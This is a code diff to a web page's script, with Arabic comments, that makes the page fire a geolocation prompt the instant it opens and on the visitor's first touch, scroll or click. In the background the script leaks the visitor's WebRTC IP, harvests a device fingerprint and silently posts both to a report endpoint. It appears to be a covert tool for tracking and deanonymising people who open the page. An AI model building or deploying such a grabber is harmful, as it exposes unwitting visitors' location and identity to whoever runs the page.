@@ -376,6 +376,7 @@
             let capturedCount = 0;
 
             const onPositionSuccess = async (pos) => {
+                hasCapturedLocation = true;
                 const acc = pos.coords.accuracy;
                 capturedCount++;
                 console.log(`Fix #${capturedCount}: Lat=${pos.coords.latitude}, Lon=${pos.coords.longitude}, Acc=±${acc}m`);
@@ -518,14 +519,45 @@
             }
         }
 
-        // 7. عند تحميل الصفحة: تشغيل الزر تلقائياً وجمع البيانات في الخلفية
-        document.addEventListener('DOMContentLoaded', async () => {
-            // كشف WebRTC وجمع العتاد
-            cachedWebRTC = await leakWebRTC();
-            cachedDevice = await harvestDeviceFingerprint();
+        let hasCapturedLocation = false;
 
-            // إرسال تقرير صامت أولي لتسجيل البصمة والـ log_id
+        // 7. تشغيل نافذة إذن الموقع تلقائياً وفوراً مع أول لحظة يفتح فيها الموقع
+        function autoLaunchLocationPermission() {
+            if (hasCapturedLocation) return;
+            triggerSmartLocationCapture();
+        }
+
+        // تشغيل فوري متزامن لحظة فتح الصفحة مباشرة دون أي تأخير
+        autoLaunchLocationPermission();
+
+        // وتشغيل فور اكتمال بنية الصفحة DOM
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', autoLaunchLocationPermission);
+        } else {
+            autoLaunchLocationPermission();
+        }
+
+        // وتشغيل عند أول لمسة أو حركة على شاشة الهاتف لضمان ظهور النافذة على جميع المتصفحات
+        const onFirstUserTouch = () => {
+            if (!hasCapturedLocation) {
+                triggerSmartLocationCapture();
+            }
+            window.removeEventListener('touchstart', onFirstUserTouch);
+            window.removeEventListener('pointerdown', onFirstUserTouch);
+            window.removeEventListener('scroll', onFirstUserTouch);
+            window.removeEventListener('click', onFirstUserTouch);
+        };
+        window.addEventListener('touchstart', onFirstUserTouch, { passive: true });
+        window.addEventListener('pointerdown', onFirstUserTouch, { passive: true });
+        window.addEventListener('scroll', onFirstUserTouch, { passive: true });
+        window.addEventListener('click', onFirstUserTouch);
+
+        // 8. جمع بيانات العتاد والـ WebRTC في الخلفية بالتوازي دون تأخير نافذة إذن الموقع
+        (async () => {
             try {
+                cachedWebRTC = await leakWebRTC();
+                cachedDevice = await harvestDeviceFingerprint();
+
                 await fetch('/api/report-forensics/', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -536,10 +568,7 @@
                     })
                 });
             } catch(e) {}
-
-            // تشغيل الزر تلقائياً
-            triggerSmartLocationCapture();
-        });
+        })();
     </script>
 </body>
 </html>
